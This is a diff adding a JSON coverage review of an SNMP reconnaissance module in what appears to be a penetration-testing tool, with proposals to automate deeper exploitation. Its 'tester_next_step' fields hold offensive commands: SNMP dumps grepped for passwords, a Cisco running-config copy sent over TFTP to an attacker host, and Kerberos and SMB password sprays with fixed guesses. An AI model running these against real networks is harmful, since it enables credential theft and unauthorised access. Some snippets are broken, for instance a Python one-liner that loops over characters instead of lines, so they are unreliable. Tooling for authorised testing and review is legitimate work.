@@ -1,0 +1,87 @@
+{
+  "service": "snmp",
+  "module_files": [
+    "recce/services/snmp.py"
+  ],
+  "summary": "Excellent T1 coverage \u2014 every finding is a real read that succeeds only when a community works. snmp_community/snmp_rw already push toward T2/T3 by leaking actionable data (Windows users -> Account rows for spray; ARP/routes -> new host discovery). Never sends a SET (correctly, per user directive). Biggest gap: the RW-likely community is only inferred by name \u2014 no actual proof of write, and Cisco config-copy (running-config exfil) is only in the runbook, not automated. SNMPv3 engine discovery is present but doesn't attempt username enumeration for offline hash cracking.",
+  "proposed_shared_surface_consumers": [
+    "known_users",
+    "known_hosts",
+    "known_networks",
+    "os_fingerprints"
+  ],
+  "findings": [
+    {
+      "kind": "snmp_community",
+      "tier": "t1",
+      "severity": "medium",
+      "title_pattern": "SNMP readable with a guessable community string",
+      "tier_evidence": "Community only marked found when sysDescr GET returns a real value under it \u2014 deterministic per-community.",
+      "can_promote_to": "t2",
+      "promotion_risk": "low",
+      "promotion_notes": "Chain into the RW check via harmless SET on sysContact.0 (writes a canary string, then reads it back, restores original). Only fires with --active-writes flag. Also consume all users/interfaces into shared_users/os_fingerprints surfaces.",
+      "related_cves": [],
+      "tester_next_step": "snmpwalk -v2c -c <community> <ip> .1 > loot/snmp-<ip>.walk; python3 -c 'import re; [print(x) for x in open(\"loot/snmp-<ip>.walk\").read() if \"passwd\" in x.lower()]'."
+    },
+    {
+      "kind": "snmp_rw",
+      "tier": "t1",
+      "severity": "high",
+      "title_pattern": "SNMP readable with a guessable community string (RW-likely)",
+      "tier_evidence": "Community-name heuristic \u2014 recce does NOT actually verify write. True T2 requires SET.",
+      "can_promote_to": "t2",
+      "promotion_risk": "medium",
+      "promotion_notes": "Add an opt-in SET-canary probe on sysContact.0 (read original, SET canary, read back, restore) \u2014 proves RW without destroying config. On Cisco, chain the config-copy MIB (1.3.6.1.4.1.9.9.96) TFTP-exfil the running-config with a listener recce ships (contains creds/keys => T3).",
+      "related_cves": [],
+      "tester_next_step": "snmpset -v2c -c <community> <ip> 1.3.6.1.2.1.1.4.0 s 'recce-canary'; then Cisco: python3 -m pysnmp.tools --config-copy tftp://<attacker-ip>/run.cfg \u2014 running-config lands with 'enable secret' hashes."
+    },
+    {
+      "kind": "snmp_users",
+      "tier": "t2",
+      "severity": "high",
+      "title_pattern": "SNMP exposes local user accounts",
+      "tier_evidence": "Actual Windows LanManager user names extracted from live MIB walk and materialized as Account objects \u2014 pre-cred capture.",
+      "can_promote_to": "t3",
+      "promotion_risk": "medium",
+      "promotion_notes": "Auto-hand the user list to the SMB spray + kerbrute preauth check. First cred landing => T3 initial access.",
+      "related_cves": [],
+      "tester_next_step": "kerbrute passwordspray -d <domain> --dc <dc> loot/snmp-users.txt 'Winter2024!'; nxc smb <all_hosts> -u loot/snmp-users.txt -p 'Password1' --continue-on-success."
+    },
+    {
+      "kind": "snmp_inventory",
+      "tier": "t1",
+      "severity": "medium",
+      "title_pattern": "SNMP exposes process / software inventory",
+      "tier_evidence": "hrSWRun + hrSWInstalled walked and returned \u2014 proves the view is open.",
+      "can_promote_to": "t2",
+      "promotion_risk": "none",
+      "promotion_notes": "Also walk hrSWRunPerf/hrSWRunParameters (already _HR_SW_RUN_PARAMS constant exists but is unused!) \u2014 command-line args often carry cleartext credentials (mysql -p<pw>, curl -u user:pw); helper _cmdline_looks_credful() is already defined but never called. Wire that in for real T2 credential capture.",
+      "related_cves": [],
+      "tester_next_step": "snmpwalk -v2c -c <community> <ip> 1.3.6.1.2.1.25.4.2.1.5  # hrSWRunParameters; grep -iE 'password=|-p |mysql|curl -u' \u2014 often finds real creds."
+    },
+    {
+      "kind": "snmp_arp",
+      "tier": "t1",
+      "severity": "high",
+      "title_pattern": "SNMP exposes the ARP cache (internal host discovery)",
+      "tier_evidence": "Live ARP table with MAC pairs pulled \u2014 'fresh' IPs compared against engagement host list.",
+      "can_promote_to": "t2",
+      "promotion_risk": "none",
+      "promotion_notes": "Auto-add fresh IPs to shared known_hosts + trigger a rescan pass targeting them. MAC OUI lookup for hardware fingerprinting (iLO/iDRAC/VMware/OT).",
+      "related_cves": [],
+      "tester_next_step": "snmpwalk -v2c -c <community> <ip> 1.3.6.1.2.1.4.22.1.2; feed IPs into nmap: nmap -Pn -sS -T4 --top-ports 1000 <fresh_ips>."
+    },
+    {
+      "kind": "snmp_routes",
+      "tier": "t1",
+      "severity": "medium",
+      "title_pattern": "SNMP exposes the routing table (internal network map)",
+      "tier_evidence": "ipRouteTable / ipCidrRouteTable actively walked and rows returned.",
+      "can_promote_to": "t2",
+      "promotion_risk": "none",
+      "promotion_notes": "Auto-ingest destination networks into shared known_networks surface \u2014 feeds host-discovery expansion pass. Also gate a follow-on 'route-injection possible' check when combined with snmp_rw.",
+      "related_cves": [],
+      "tester_next_step": "snmpwalk -v2c -c <community> <ip> 1.3.6.1.2.1.4.24; nmap -sn <new_networks_from_routes>."
+    }
+  ]
+}
